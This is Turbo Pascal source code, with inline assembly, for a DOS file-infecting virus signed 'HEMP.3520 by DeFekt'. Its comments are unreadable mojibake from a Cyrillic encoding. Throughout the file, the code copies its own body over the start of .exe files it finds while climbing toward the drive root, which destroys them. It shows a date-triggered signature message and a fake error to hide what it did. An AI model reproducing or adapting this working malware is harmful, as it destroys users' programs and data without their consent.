{$S-,I-}              {������� ���������� �� 㬥��襭�� ���� �����}
uses dos;             {�ᯮ��㥬 ������� DOSa}
const l = 3520;       {����� ⥫� �����}
x = '*.exe';
var we : file;
b : array[1..l] of byte;
procedure VD;         {��楤�� �஢�ન ���� � �뢮�� �� �࠭ ����ࠩ⮢}
var y,m,d,dw : word;
begin
getdate(y,m,d,dw);    {��६ ⥪���� ����}
if m = d+1 then begin {�᫨ ����� = ���� + 1}
asm
   @sm:  db   'HEMP.3520 BY DeFekt$'        {�뢮��� ����ࠩ��}
   push ds
   push cs
   pop  ds
   mov  dx,offset @sm
   mov  ah,9
   int  21h
   pop  ds
end;
halt;                                       {��室��}
end
else exit;            {� �᫨ ����� != ���� +1, � ��祣� �� ������ :}
end;
procedure IFile(path : string); {��楤�� ��ࠦ���� 䠩���}
var they : file;
begin
assign(they,path);
reset(they,1);        {���뢠�� 䠩�}
blockwrite(they,b,l); {�����뢠�� �㤠 ᢮� ���}
close(they);
end;
procedure findf;      {��楤�� ���᪠ 䠩���}
var SR : searchrec;
h, m, s, sot : word;
begin
gettime(h,m,s,sot);   {��६ ⥪�饥 �६�}
s := m div h;         {����� ������ �� ��� - ����砥� �㦭�� ���-�� 䠩���}
if s = 0 then exit;   {�᫨ १���� ������� 0, ��室��}
h :=0;
findfirst(x,anyfile,SR); {�饬 䠩�}
for h := 1 to s+1 do begin
IFile(SR.name);       {��ࠦ���}
findnext(SR);
end;
end;
procedure sInfFile;   {�஢�ઠ �� ��७ ��᪠}
var i : byte; dir : string;
begin
getdir(0,dir);        {��६ ⥪���� ��ਪ���}
if dir = chr(65)+':\' then chdir(chr(67)+':\'); findf;  {�᫨ � �:\ � �饬 䠩�� ��� ��ࠦ���� � C:\}
for i := 66 to 90 do begin
if dir = chr(i)+':\' then exit {�᫨ ��� ࠢ�� A..Z+:\, � ��室��}
else chdir('..'); findf; {�᫨ �� � ��୥, � ���室�� �� �஢��� �����}
end;
end;
begin
assign(we,paramstr(0));
reset(we,1);
blockread(we,b,l);       {��⠫� ⥫� ����� � ���ᨢ}
close(we);
sInfFile;                {�஢�ઠ �� ��७� ��᪠}
findf;                   {�� ���� 䠩���}
VD;                      {�஢�ઠ ���� � ���������� ����ࠩ⮢}
asm
   @ms:  db   'ERROR IN 0x532x0$'    {�뢮��� ������ �訡�� �� �࠭}
   push ds
   push cs
   pop  ds
   mov  dx,offset @ms
   mov  ah,9
   int  21h
   pop  ds
end;
asm
   jmp @e
   db 'HEMP.3520 by DeFekt$'   {����ࠩ�� - ��� �� ��� ���...:}
   @e:
end;
end.                           {��� � ��!}